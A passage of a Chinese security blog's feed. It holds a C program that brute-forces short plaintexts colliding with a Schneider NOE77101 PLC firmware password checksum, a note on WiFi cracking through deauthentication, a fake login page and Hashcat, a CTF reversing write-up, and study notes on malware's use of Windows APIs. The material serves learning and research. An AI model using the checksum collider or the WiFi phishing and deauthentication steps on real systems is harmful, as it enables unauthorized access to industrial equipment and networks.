class="line">&#125;</span><br><span class="line"></span><br><span class="line">// builds a random password</span><br><span class="line">void random_password(char *password) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int length = rand() % (MAX_LENGTH - MIN_LENGTH) + MIN_LENGTH;</span><br><span class="line">  for(i = 0; i &lt; length; i++)</span><br><span class="line">    password[i] = charset[rand() % CHARSET_LENGTH];</span><br><span class="line">  password[length] = &apos;\0&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// randomly creates checksums</span><br><span class="line">//</span><br><span class="line">// when it discovers a shorter input plaintext for a checksum that has already</span><br><span class="line">// been calculated, it replaces the existing plaintext with the new, shorter</span><br><span class="line">// one</span><br><span class="line">void brute(int runs) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  char password[MAX_LENGTH + 1];</span><br><span class="line">  unsigned long s;</span><br><span class="line"></span><br><span class="line">  for(i = 0; i &lt; runs; i++) &#123;</span><br><span class="line">    random_password(password);</span><br><span class="line">    s = sum(password);</span><br><span class="line">    if(s &gt; MAX_SUM) &#123;</span><br><span class="line">      printf(&quot;error! sum too big&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    if(sums[s][0] == &apos;\0&apos; || strlen(password) &lt; strlen(sums[s])) &#123;</span><br><span class="line">      strcpy(sums[s], password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// returns the number of checksums in the table</span><br><span class="line">int count() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int c = 0;</span><br><span class="line">  for(i = 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] != &apos;\0&apos;)</span><br><span class="line">      c++;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// prints discovered checksums</span><br><span class="line">void dump_table() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  for(i = 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] != &apos;\0&apos;)</span><br><span class="line">      printf(&quot;%d\t%s\n&quot;, i, sums[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  brute(1000000000);</span><br><span class="line">  printf(&quot;%d checksums\n&quot;, count());</span><br><span class="line">  dump_table();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，对施耐德NOE77101的基本探究就结束了，其他漏洞还包括wireshark抓ftp包，账号密码明文显示等，就留着以后研究了，总体来说还是很有收获。</p><p>See you again！</p><p>From <a href="https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/">https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;施耐德NOE77101以太网模块固件逆向及后门挖掘&quot;&gt;&lt;a href=&quot;#施耐德NOE77101以太网模块固件逆向及后门挖掘&quot; class=&quot;headerlink&quot; title=&quot;施耐德NOE77101以太网模块固件逆向及后门挖掘&quot;&gt;&lt;/a&gt;施耐德NOE77101
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="PLC固件" scheme="https://kabeor.github.io/tags/PLC%E5%9B%BA%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>对WiFi密码安全的基础认识</title>
    <link href="https://kabeor.github.io/%E5%AF%B9WiFi%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
    <id>https://kabeor.github.io/对WiFi密码安全的基础认识/</id>
    <published>2018-06-23T14:08:28.541Z</published>
    <updated>2018-07-19T05:26:00.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对WiFi密码安全的基础认识"><a href="#对WiFi密码安全的基础认识" class="headerlink" title="对WiFi密码安全的基础认识"></a>对WiFi密码安全的基础认识</h1><p>这篇文章是测试WiFi渗透和密码破解常用步骤的简单记录</p><h2 id="1-抓取握手包"><a href="#1-抓取握手包" class="headerlink" title="1. 抓取握手包"></a>1. 抓取握手包</h2><p>一般常用</p><blockquote><p>aircrack-ng<br>Fluxion <a href="https://www.jianshu.com/p/d16e86c41336" target="_blank" rel="noopener">https://www.jianshu.com/p/d16e86c41336</a><br>其他 <a href="http://www.4hou.com/tools/5584.html" target="_blank" rel="noopener">http://www.4hou.com/tools/5584.html</a></p></blockquote><p>比较有意思的是用社工思路，将用户攻击掉线，伪装登陆页面，骗取用户WiFi密码，省去了爆破的时间</p><blockquote><p>airgeddon <a href="https://www.77169.com/html/211103.html" target="_blank" rel="noopener">https://www.77169.com/html/211103.html</a></p></blockquote><h3 id="如何将用户断开AP？"><a href="#如何将用户断开AP？" class="headerlink" title="如何将用户断开AP？"></a>如何将用户断开AP？</h3><p>方式有很多，后期会渐渐补充</p><blockquote><p>Deauthentication Attack Detection（取消身份验证洪水攻击） <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect</a></p></blockquote><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><blockquote><p>Wifi 四次握手认证与暴力破解 <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd</a></p></blockquote><p>跑字典非常考验硬件性能，和字典的有效性也密不可分<br>aircrack-ng套件中就有该功能</p><p>如果使用GPU超强的运算速度进行暴力密码破解效率就会提升很多</p><p>HashCat应该目前最好的GPU破解HASH的软件</p><blockquote><p><a href="https://www.77169.com/html/211124.html" target="_blank" rel="noopener">https://www.77169.com/html/211124.html</a></p></blockquote><p>From <a href="https://kabeor.github.io/对WiFi密码安全的基础认识/">https://kabeor.github.io/对WiFi密码安全的基础认识/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对WiFi密码安全的基础认识&quot;&gt;&lt;a href=&quot;#对WiFi密码安全的基础认识&quot; class=&quot;headerlink&quot; title=&quot;对WiFi密码安全的基础认识&quot;&gt;&lt;/a&gt;对WiFi密码安全的基础认识&lt;/h1&gt;&lt;p&gt;这篇文章是测试WiFi渗透和密码破解常用步骤
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    
      <category term="WiFi安全" scheme="https://kabeor.github.io/tags/WiFi%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>看雪.京东 2018CTF helloctf</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/"/>
    <id>https://kabeor.github.io/看雪.京东 2018CTF helloctf/</id>
    <published>2018-06-16T05:44:09.660Z</published>
    <updated>2018-07-19T05:25:14.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-京东-2018CTF-helloctf"><a href="#看雪-京东-2018CTF-helloctf" class="headerlink" title="看雪.京东 2018CTF helloctf"></a>看雪.京东 2018CTF helloctf</h1><p>IDA打开，<br><img src="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" alt="mark"></p><p>F5之后<br><img src="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" alt="mark"></p><p>do…while循环就是核心算法<br>自己提取出来<br><img src="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" alt="mark"></p><p>意思就很明显了，需要注意的就是asc_408044内是字符串%x，也就是16进制，sprintf是字符串类型格式化，很显然这里就是将输入字符串转换为16进制，strcat为将后一字符串加到前一字符串尾部，这里很显然就是32位0再加437261636b4d654a757374466f7246756e</p><p>所以我们只需要将其进行16进制转字符串即可(多个0可省略，只需补齐位数为偶数)<br><img src="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/看雪.京东 2018CTF helloctf/">https://kabeor.github.io/看雪.京东 2018CTF helloctf/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;看雪-京东-2018CTF-helloctf&quot;&gt;&lt;a href=&quot;#看雪-京东-2018CTF-helloctf&quot; class=&quot;headerlink&quot; title=&quot;看雪.京东 2018CTF helloctf&quot;&gt;&lt;/a&gt;看雪.京东 2018CTF helloc
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第7章 分析恶意Windows程序</title>
    <link href="https://kabeor.github.io/%E7%AC%AC7%E7%AB%A0%20%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
    <id>https://kabeor.github.io/第7章 分析恶意Windows程序/</id>
    <published>2018-06-07T11:26:41.389Z</published>
    <updated>2018-07-19T05:22:29.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-分析恶意Windows程序"><a href="#第七章-分析恶意Windows程序" class="headerlink" title="第七章 分析恶意Windows程序"></a>第七章 分析恶意Windows程序</h1><h2 id="7x1-Windows-API"><a href="#7x1-Windows-API" class="headerlink" title="7x1 Windows API"></a>7x1 Windows API</h2><h3 id="1-类型和匈牙利表达法"><a href="#1-类型和匈牙利表达法" class="headerlink" title="1. 类型和匈牙利表达法"></a>1. 类型和匈牙利表达法</h3><p>Windows总体上使用匈牙利表达法作为API函数标识符，表达式使用前缀命名模式</p><blockquote><p>Windows API常见类型<br><img src="https://i.loli.net/2018/07/19/5b5020109dc75.jpg" alt="mark"></p></blockquote><h3 id="2-句柄"><a href="#2-句柄" class="headerlink" title="2. 句柄"></a>2. 句柄</h3><p>句柄是在操作系统中被打开或被创建的项(一个窗口，进程，模块，菜单，文件等)<br>句柄不能用来做数学操作<br>我们所能做的只有保存它，并在后续函数调用中使用它来引用同一个对象</p><h3 id="3-文件系统函数"><a href="#3-文件系统函数" class="headerlink" title="3. 文件系统函数"></a>3. 文件系统函数</h3><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件<br>独特文件名或修改为既有文件名是明显的基于主机的感染迹象</p><blockquote><p>CreateFile</p></blockquote><p>用来创建和打开文件，可打开已存在的文件，管道，流，及I/O设备，能创建新文件</p><blockquote><p>ReadFile和WriteFile</p></blockquote><p>用来对文件进行读和写操作</p><blockquote><p>CreatFileMapping和MapViewOfFile</p></blockquote><p>从磁盘加载一个文件到内存和返回一个指向映射的基地址指针(可用来访问内存中的文件)</p><p><img src="https://i.loli.net/2018/07/19/5b502010b0ca7.jpg" alt="mark"></p><h3 id="4-特殊文件"><a href="#4-特殊文件" class="headerlink" title="4. 特殊文件"></a>4. 特殊文件</h3><blockquote><p>共享文件</p></blockquote><p>以\serverName\share或\?\serverName\share开头命名的特殊文件，用来访问在共享目录中的目录或文件</p><blockquote><p>通过名字空间访问的文件</p></blockquote><p>名字空间可以被认为是固定数目的文件夹，每一个文件夹中保存不同类型的对象。底层的名字空间是NT名字空间，以前缀＼开始。NT名字空间可以访问所有设备，以及所有在NT名字空间中存在的其他名字空间。</p><p>以前缀\.\开始的Win32设备名字空间，经常被恶意代码用来直接访问物理设备，并且像一个文件一样进行读写操作</p><p>使用\Device\PhysicalMemory 来直接访问物理内存，这允许用户空间程序写到内核空间中。这个技术已经被恶意代码用来修改内核，并隐藏用户空间的程序。</p><blockquote><p>备用数据流</p></blockquote><p>备用数据流(ADS）特性允许附加数据被添加到一个已存在的NTFS文件中，相当于添加一 个文件到另外一 文件中。额外数据在列一 个目录时不会被显示出来，并且当显示文件内容时也不显示；而只有在你访问流时，它才是可见的。<br>ADS数据流根据约定normalFile.txt:Stream:$DATA来命名，这允许一个程序去读写一个流。恶意代码作者喜欢ADS，因为它能被用来隐藏数据。</p><h2 id="7x2-Windows注册表"><a href="#7x2-Windows注册表" class="headerlink" title="7x2 Windows注册表"></a>7x2 Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序的配置信息<br><img src="https://i.loli.net/2018/07/19/5b502010c596d.jpg" alt="mark"></p><h3 id="1-注册表根键"><a href="#1-注册表根键" class="headerlink" title="1. 注册表根键"></a>1. 注册表根键</h3><p><img src="https://i.loli.net/2018/07/19/5b502010de480.jpg" alt="mark"></p><h3 id="2-Regedit"><a href="#2-Regedit" class="headerlink" title="2. Regedit"></a>2. Regedit</h3><p>注册表编辑器，Windows内建的用来查看和编辑注册表的工具</p><h3 id="3-自启动程序"><a href="#3-自启动程序" class="headerlink" title="3. 自启动程序"></a>3. 自启动程序</h3><p>向Run子键中写入项，可设置程序自启动<br>Autoruns工具列举在操作系统启动时会自动启动运行的代码</p><h3 id="4-常用注册表函数"><a href="#4-常用注册表函数" class="headerlink" title="4. 常用注册表函数"></a>4. 常用注册表函数</h3><p><img src="https://i.loli.net/2018/07/19/5b50201101f17.jpg" alt="mark"></p><h3 id="5-练习分析注册表操作代码"><a href="#5-练习分析注册表操作代码" class="headerlink" title="5. 练习分析注册表操作代码"></a>5. 练习分析注册表操作代码</h3><h3 id="6-使用-reg文件的注册表脚本"><a href="#6-使用-reg文件的注册表脚本" class="headerlink" title="6. 使用.reg文件的注册表脚本"></a>6. 使用.reg文件的注册表脚本</h3><h2 id="7x3-网络API"><a href="#7x3-网络API" class="headerlink" title="7x3 网络API"></a>7x3 网络API</h2><h3 id="1-伯克利兼容套接字"><a href="#1-伯克利兼容套接字" class="headerlink" title="1. 伯克利兼容套接字"></a>1. 伯克利兼容套接字</h3><p>网络功能在Windows系统中由Winsock库实现，主要在ws2_32.dll中<br><img src="https://i.loli.net/2018/07/19/5b50201121de3.jpg" alt="mark"><br>WSAStartup函数必须在其他网络函数之前被调用<br>调试代码查找网络接口时，可在WSAStartup函数中设置断点</p><h3 id="2-网络的服务器和客户端"><a href="#2-网络的服务器和客户端" class="headerlink" title="2. 网络的服务器和客户端"></a>2. 网络的服务器和客户端</h3><p>一个网络程序通常有两个端点:服务器端，它维护一个打开套接字并等待入站连接：客户端，它连接到一个正在等待的套接字。而恶意代码可以是这两端中的任意一个。</p><h3 id="3-WinINet-API"><a href="#3-WinINet-API" class="headerlink" title="3. WinINet API"></a>3. WinINet API</h3><p><img src="https://i.loli.net/2018/07/19/5b50201135003.jpg" alt="mark"></p><h2 id="7x4-跟踪恶意代码的运行"><a href="#7x4-跟踪恶意代码的运行" class="headerlink" title="7x4 跟踪恶意代码的运行"></a>7x4 跟踪恶意代码的运行</h2><h3 id="1-DLL"><a href="#1-DLL" class="headerlink" title="1. DLL"></a>1. DLL</h3><blockquote><p>动态链接库（DLL)是使用库来在多个应用程序之间共享代码的Windows特有方式。一个DLL程序是不能独自运行的可执行文件，但它可以导出一些被其他应用程序使用的函数。<br>被DLL程序使用的内存可以在正运行的进程之间共享。<br>在发布一个可执行文件时，你可以使用Windows系统上已 知的DLL程序，而无须去重新发布它们。这帮助软件开发者和恶意代码作者最小化发布软件的大小规模。<br>DLL程序也是一种有用的代码复用方式</p></blockquote><h4 id="恶意代码作者如何使用DLL"><a href="#恶意代码作者如何使用DLL" class="headerlink" title="恶意代码作者如何使用DLL"></a>恶意代码作者如何使用DLL</h4><blockquote><p>保存恶意代码<br>通过使用Windows DLL<br>通过使用第三方DLL</p></blockquote><h4 id="基本DLL结构"><a href="#基本DLL结构" class="headerlink" title="基本DLL结构"></a>基本DLL结构</h4><blockquote><p>DLL使用PE文件格式，并且只有一个单一标志，指示这个文件是一个<br>DLL,而不是一个.exeDLL经常有更多导出函数，并且通常导入函数较少。<br>DLL的主函数是DllMain。它没有标记，而且并不是一个DLL中的导出函数，但是它在PE头中被指定为文件的入口点。任何时候一个进程加载或卸载库，会创建一个新线程，或一个已程结束时，这个函数都会被调用来通知DLL。这个通知允许DLL来管理每个进程或每个线程的资源存在的线<br>程的资源。</p></blockquote><h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h3><h4 id="创建一个新进程"><a href="#创建一个新进程" class="headerlink" title="创建一个新进程"></a>创建一个新进程</h4><p>恶意代码最常使用的创建新进程函数是CreateProcess</p><blockquote><p>恶意代码通常使用C reateP rocess,来创建一个简单的远程shell- CreateProcess函数的一个参数，STARTUPINFO结构，包含一个进程的标准输入、标准输出以及标准错误流的句柄。一个恶意程序可以设置这些值为套接字，这样当这个程序写入标准输出时，它实际上会写到套接字上，因而允许一个攻击者执行远程shell,而不需要运行除CreateProcess之外的任何函数。</p></blockquote><h3 id="3-线程"><a href="#3-线程" class="headerlink" title="3. 线程"></a>3. 线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。线程是被CPU执行的独立指令序列，而不需要等待其他线程。一个进程包含一个或多个线程，它们执行进程中的一部分代码。一个进程中的所有线程共享同样的内存空间，但是每一个有它自己的处理器、寄存器和栈。</p><h4 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h4><blockquote><p>当一个线程运行时，它对CPU或CPU核有着完全的控制，并且其他线程不能影响CPU或核的状态。当一个线程改变CPU中某个寄存器的值时，它不会影响任何其他线程。一个操作系统在线程间切换之前，在CPU中的所有值会被保存到一个称为线程上下文的结构体中。然后操作系统加载这个线程上下文到一个新的线程中，并使这个新线程在CPU中执行</p></blockquote><h4 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h4><blockquote><p>CreateThread函数被用来创建一个新线程。函数的调用者指定一个起始地址，它经常被叫做sta rt函数。执行从这个起始地址开始直到这个函数返回，尽管这个函数不需要返回，这个线程可以在进程结束前一直运行。<br>CreateThread的调用者可以指定线程开始的函数位置，并且一个单一参数可以被传递给这个start函数。这个参数可以是任意值，依赖于这个线程要开始执行的函数。</p><p>• 恶意代码可以使用CreateThread,来加载一个新的恶意库文件到进程中，通过在调用CreateThread时将起始地址设置为Load Library的地址。 （传递给CreateThread的参数是要被加载库的名字。新的DLL被加载到这个进程的内存中，然后DllMain被调用。）<br>• 恶意代码可以为输入和输出创建两个线程：一个用来在套接字或管道上监听，并输出到一个进程的标准输入里，另一个用来从标准输出读取数据，并发送到套接字或管道上，恶意代码的目标是发送所有信息到单一的套接字或管道，来和运行的应用程序进行无缝通信。</p></blockquote><h3 id="4-使用互斥量的进程间协作"><a href="#4-使用互斥量的进程间协作" class="headerlink" title="4. 使用互斥量的进程间协作"></a>4. 使用互斥量的进程间协作</h3><blockquote><p>互斥量（mutex), 在内核中也称为互斥门（mutant)是全局对象，用于协调多个进程和线程。<br>互斥量主要用于控制共享资源的访问，并且经常被恶意代码所使用。<br>同一时刻，只有一个线程拥有一个互斥量。</p><p>线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，井且任何后续线程试图获取对它的访问时，都必须等待。当一个线程完成对互斥量的使用后，需要使用ReleaseMutex函数。</p><p>一个互斥量可以通过CreateMutex函数进行创建。而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。恶意代码通常创建一个互斥量，并试图使用同一个名字来打开一个已存在的互斥量，通过这种方式，可以确定恶意代码一次只有一个唯一实例在运行。</p></blockquote><h3 id="5-服务"><a href="#5-服务" class="headerlink" title="5. 服务"></a>5. 服务</h3><p>恶意代码执行附加代码的另一种方式是将它作为服务安装。Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；代码被Windows服务管理器调度和运行，但没有用户输入。在Windows操作系统上的任何指定时间，都会有多个服务在运行。</p><p>服务也提供另一种在系统上维护持久化驻留的方式，因为它们可以被设置成当操作系统启动时 自动运行，并且可能甚至不在任务管理器中作为一个进程显示出来。一个用户查找所有运行的应用程序，也不会找到任何可疑的东西，因为恶意代码不是运行在一个独立进程中。</p><p>服务可以通过一些Windows API函数来进行安装和操作</p><blockquote><p>OpenSCManager： 返回一个服务控制管理器的句柄，它被用来进行所有后续与服务相关的函数调用。所有要和服务交互的代码会调用这个函数。<br>CreateService： 添加一个新服务到服务控制管理器，并且允许调用者指定服务是否在引导时自动启动，或者必须手动启动。<br>StartService： 启动一个服务，并且仅在服务被设置成手动启动时使用。</p></blockquote><p>Windows操作系统支持多种服务类型，它们以独特的方式执行。恶意代码最常使用的是WIN32_SHARE_PR0CESS类型，这种类型将这个服务的代码保存在一个DLL中，并且在一个共享的进程中组合多个同的服务。在任务管理器中，你可以找到一个名为svchost.exe进程的多个实例，它们在运行WIN32_SHARE_PR0CESS类型的服务。</p><blockquote><p>WIN32_OWN_PROCESS类型有时也被使用，因为它在一个.exe文件中保存代码，而且作为一个独立进程运行。</p><p>最后一个常见的服务类型是KERNEL_DRIVER,它被用来加载代码到内核中执行。</p><p>关于本地系统上服务的信息被保存在注册表中。每个服务在HKLM\SYSTEM\CurrentControlSet\Services下面有一个子键。</p></blockquote><h3 id="6-组件对象模型"><a href="#6-组件对象模型" class="headerlink" title="6. 组件对象模型"></a>6. 组件对象模型</h3><p>微软组件对象模型（COM)是一个接口标准，它使得不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</p><p>COM可以支持任何编程语言，并且被设计成一种可复用的软件组件，并可以被所有程序所利用。COM使用了一个对象结构，在与面向对象的编程语言中可以很好配合使用，COM也并不排斥非面向对象的编程语言。</p><p>COM被实现成一个客户-服务器框架。客户端是那些使用COM对象的程序，服务器是那些可复用的软件组件——也就是COM对象本身。微软提供了很多COM对象给程序使用。</p><p>每一个使用COM的线程，必须在调用任何其他COM库函数之前，至少调用一次Olelnitialize或CoInitializeEx函数。所以，一个恶意代码分析师可以搜索这些调用，来判断一个程序是否使用了COM功能，然而，知道恶意代码片段作为客户端程序使用COM对象并没有提供很多信息，因为COM对象是繁杂且广泛的。一旦你判断程序在使用COM,你就需要找到一些正在被使用对象的标识符来继续分析。</p><h4 id="CLSID、IID-以及COM对象的使用"><a href="#CLSID、IID-以及COM对象的使用" class="headerlink" title="CLSID、IID ,以及COM对象的使用"></a>CLSID、IID ,以及COM对象的使用</h4><blockquote><p>COM对象通过它们的全局唯一标识符(GUID),分为类型标识符(CLSID)以及接口标识符(IID)来进行访问。</p><p>CoCreatelnstance函数被用来获取对COM功能的访问。恶意代码使用的一个常用函数是Navigate , 它允许一个 程 序 启 动 Internet Explorer, 并访问一 个 Web地 址。Navigate函数是IWebBrowser2组件接口的一部分，这个接口指定了一个必须被实现的函数列表，但是它没有指定哪个程序会提供这个功能。提供这个功能的程序就是实现了IWebBrowser2接口的COM类。在多数例子中，IWebBrowser2接口被Internet Explorer实现。接口通过一个叫做IID的GUID来标识，而COM类通过一个叫做CLS1D的GUID来标识。</p></blockquote><h4 id="COM服务器恶意代码"><a href="#COM服务器恶意代码" class="headerlink" title="COM服务器恶意代码"></a>COM服务器恶意代码</h4><p>有些恶意代码实现了一个恶意COM服务器，继而被其他应用使用。对恶意代码来说，常用的COM服务器功能是通过浏览器帮助对象（B H O ), 这是Internet Explorer的第三方插件。BHO没有限制，所以恶意代码作者使用它们在Internet Explorer®程中运行代码，这允许他们监控互联网流量、跟踪浏览器的使用，以及与互联网通信，而且并不使用它们自己的进程。</p><p>实现一个COM服务器的恶意代码通常很容易检测，因为它导出了几个函数，包括DllCanUnloadNow、DllGetClassObject、Dlllnstall、DI 1 RegisterServer, 以及DllUnregisterServer，它们都必须由COM服务器软件导出。</p><h3 id="7-异常：当事情出错时"><a href="#7-异常：当事情出错时" class="headerlink" title="7. 异常：当事情出错时"></a>7. 异常：当事情出错时</h3><p>异常机制允许一个程序在普通执行流程之外处理事件。多数时间里，异常是由错误引起的，诸如除零错误。当一个异常发生时，执行转移到处理这个异常的特殊例程。有些异常，比如除零异常，是由硬件抛出的；其他的，比如无效内存访问，是由操作系统抛出的。你也可以在代码中使用RaiseException调用，显式地抛出一个异常。</p><p>结构化异常处理(SEH)是Windows的异常处理机制。在一个32位系统中，SEH信息被保存在桟上。</p><p>异常处理器是可嵌套的，并且不是所有的处理器都会对应着所有异常。如果当前帧的异常处理器不处理这个异常，这个异常会被传递给调用者帧的异常处理器。最终，如果这些异常处理器中没有一个响应这个异常，那么顶层的异常处理器将使应用程序崩溃。</p><p>异常处理器可以让恶意代码获得执行机会。一个指向异常处理信息的指针被保存在栈上，在栈溢出时，一个攻击者可以覆盖这个指针。通过指定一个新的异常处理器，攻击者可以在一个异常发生时获得执行机会。</p><h2 id="7x5-内核与用户模式"><a href="#7x5-内核与用户模式" class="headerlink" title="7x5 内核与用户模式"></a>7x5 内核与用户模式</h2><p>Windows使用两种处理器特权级别：内核模式与用户模式。</p><p>几乎所有代码都运行在用户模式，除了操作系统和硬件驱动，它们运行在内核模式。在用户模式，每一个进程有它自己的内存、安全权限，以及资源。如果一个用户模式程序执行一个无效指令并崩溃，Windows可以回收所有资源，并终止这个程序</p><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于Windows API。</p><p>当你调用一个Windows API函数操作内核结构体时，它会通过一个调用进入内核。在反汇编中SYSENTER、SYSCALL或者INT 0x2E的存在，指明一个调用被使用进入到内核。直接通过跳转从用户模式到内核模式是不可能的，这些指令使用查找表来定位一个预定义函数，从而在内核中执行代码。</p><p>所有运行在内核的进程共享资源和内存地址。内核模式代码有更少的安全检查。如果在内核运行的代码执行并且包含无效指令，操作系统就不能继续运行，产生的结果就是著名的Windows蓝屏。</p><p>运行在内核中的代码可以操纵运行在用户空间的代码，但是运行在用户空间的代码只能通过定义好的接口来影响内核。即使所有运行在内核的代码共享内存和资源，处于活跃状态的进程上下文也总是只有一个。</p><h2 id="7x6-原生API"><a href="#7x6-原生API" class="headerlink" title="7x6 原生API"></a>7x6 原生API</h2><p>原生API是用来和Windows进行交互的底层API。<br>调用原生API函数可以绕过普通的Windows API。</p><p>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要数据结构都被保存在内核中，在内核外面的代码 （用户模式代码）是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。<br><img src="https://i.loli.net/2018/07/19/5b5020114d7ce.jpg" alt="mark"></p><p>用户应用程序被给予对用户API (比如kernel32.dll和其他DLL)的访问，这些DLL会调用ntdlLdll,这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式,并执行一个内核中的函数，通常它位于ntoskrnl.exe中。这个过程是令人费解的，但是内核和用户API之间的分离，允许微软修改内核而不会影响应用程序。</p><p>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了原生API。</p><blockquote><p>尽管微软不提供关于原生API的完整文档，还是有网站和书来文档化这些函数。最好的参考书是由GaryNebbett (Sams, 2000)撰写的Windows NT/2000 Native API Reference，尽管它已经很旧了。在线资源如 <a href="http://undocumented.ntinternals.net" target="_blank" rel="noopener">http://undocumented.ntinternals.net</a> 以提供最近的信息。</p></blockquote><p>有一系列的原生API调用可以被用来获取关于系统的信息、进程、线程、句柄，以及其他项目。这 些 包 括 NtQuerySystemlnformation , NtQuerylnformationProcess &gt; NtQuerylnformationThread &gt; NtQuerylnformationFile, 以及NtQuerylnformationKey。这些调用提供比任何可用Win32调用更详细的信息，并且其中一些函数允许你给文件、进程、线程等设置细粒度的属性。</p><p>另一个恶意代码普遍使用的原生API函数是NtContinue。这个函数被用来从一个异常处理返回，并且它的意图是在一个异常被处理后转移执行回到一个程序的主线程。然而，要返回的位置在异常上下文中被指定，并且它可以被修改。恶意代码经常使用这个函数来以复杂的方式转移执行，从而使一个分析师感到困惑，并且使一个程序更加难调试。</p><p>原生应用程序是那些不使用Win32子系统而只调用原生API的应用程序。这样的应用程序对恶意代码来说是罕见的，对非恶意代码来说几乎是不存在的，所以一个原生应用程序很可能就是恶意的。在PE头中的子系统指明了一个程序是不是原生应用程序。</p><p>From <a href="https://kabeor.github.io/第7章 分析恶意Windows程序/">https://kabeor.github.io/第7章 分析恶意Windows程序/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
